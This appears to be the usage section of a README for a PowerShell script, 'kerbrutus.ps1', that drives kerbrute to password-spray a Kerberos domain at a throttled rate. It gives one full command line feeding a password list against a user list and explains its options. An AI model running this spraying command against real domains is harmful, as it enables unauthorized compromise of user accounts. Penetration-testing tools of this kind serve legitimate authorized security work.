# Usage

```PowerShell
.\kerbrutus.ps1 -ExecutionCount 2 -TimeWindowMinutes 1 -CommandTemplate '..\kerbrute.exe passwordspray -d domain.local .\users.txt -v "<pass>"' -PasswordsFile .\passwords.txt -OutputFile results.log
```

In `-CommandTemplate` the `<pass>` is placeholder value that will be populated in the command from the specified file in `-PasswordsFile`.
Value specified in `-OutputFile` will have all results appended to it.
